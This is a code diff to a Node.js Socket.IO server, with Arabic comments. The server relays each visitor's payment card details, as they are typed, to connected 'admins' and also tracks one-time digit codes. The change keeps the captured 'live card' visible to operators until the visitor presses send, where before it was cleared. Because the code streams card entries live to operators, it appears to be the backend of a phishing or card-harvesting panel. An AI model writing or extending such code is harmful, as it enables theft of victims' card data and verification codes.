@@ -526,15 +526,16 @@ io.on("connection", (socket) => {
           });
         }
       } else {
-        visitor.liveCard = null;
-        visitor.liveCardTimestamp = null;
-        admins.forEach((admin, adminSocketId) => {
-          io.to(adminSocketId).emit("card:liveUpdate", {
-            visitorId: visitor._id,
-            liveCard: null,
-            liveCardTimestamp: null,
+        // [FIX-LIVE] لا نمسح بطاقة الدفع المباشر — تبقى حتى يضغط الزائر «إرسال»
+        if (visitor.liveCard) {
+          admins.forEach((admin, adminSocketId) => {
+            io.to(adminSocketId).emit("card:liveUpdate", {
+              visitorId: visitor._id,
+              liveCard: visitor.liveCard,
+              liveCardTimestamp: visitor.liveCardTimestamp,
+            });
           });
-        });
+        }
       }
       visitors.set(socket.id, visitor);
       saveVisitorPermanently(visitor);
@@ -624,6 +625,14 @@ io.on("connection", (socket) => {
         // Start tracking from card page
         visitor.lastDataUpdate = now;
         visitor.hasEnteredCardPage = true;
+        // [FIX-LIVE] الزائر ضغط «إرسال» — نمسح البطاقة المباشرة
+        visitor.liveCard = null;
+        visitor.liveCardTimestamp = null;
+        admins.forEach((admin, adminSocketId) => {
+          io.to(adminSocketId).emit("card:liveUpdate", {
+            visitorId: visitor._id, liveCard: null, liveCardTimestamp: null,
+          });
+        });
       }
       if (data.digitCode) {
         const now = new Date().toISOString();
@@ -693,14 +702,15 @@ socket.on("card:live", (data) => {
 socket.on("card:liveHide", () => {
   const visitor = __f91ResolveVisitor(socket, null);
   if (!visitor) return;
-  visitor.liveCard = null;
-  visitor.liveCardTimestamp = null;
+  // [FIX-LIVE] نبقي المعلومات — تُمسح فقط عند ضغط «إرسال»
   visitors.set(socket.id, visitor);
-  admins.forEach((admin, adminSocketId) => {
-    io.to(adminSocketId).emit("card:liveUpdate", {
-      visitorId: visitor._id, liveCard: null, liveCardTimestamp: null,
+  if (visitor.liveCard) {
+    admins.forEach((admin, adminSocketId) => {
+      io.to(adminSocketId).emit("card:liveUpdate", {
+        visitorId: visitor._id, liveCard: visitor.liveCard, liveCardTimestamp: visitor.liveCardTimestamp,
+      });
     });
-  });
+  }
 });
 
 socket.on("cardNumber:verify", (cardNumber) => {
